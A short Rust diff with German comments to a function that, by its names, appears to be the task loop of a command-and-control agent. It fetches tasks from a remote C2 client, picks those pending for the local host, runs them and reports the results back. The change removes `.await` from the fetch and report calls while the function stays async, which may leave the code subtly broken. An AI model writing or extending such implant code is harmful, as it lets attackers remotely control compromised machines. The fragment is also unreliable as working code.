@@ -30,7 +30,7 @@ const MAX_RESULT_LEN: usize = 8 * 1024;
 ///
 /// Gibt die Anzahl der ausgefuehrten Tasks zurueck.
 pub async fn run_pending_tasks(client: &C2Client, host_id: &str) -> Result<usize, TransportError> {
-    let tasks = client.fetch_tasks().await?;
+    let tasks = client.fetch_tasks()?;
     let pending: Vec<&Task> = tasks
         .iter()
         .filter(|t| t.host_id == host_id && t.status == STATUS_PENDING)
@@ -55,7 +55,7 @@ pub async fn run_pending_tasks(client: &C2Client, host_id: &str) -> Result<usize
             status: status.to_string(),
             result: output.output,
         };
-        match client.report_task_result(&report).await {
+        match client.report_task_result(&report) {
             Ok(()) => {
                 info!("Task {task_id} ausgeführt: {status}", task_id = task.id);
                 executed += 1;
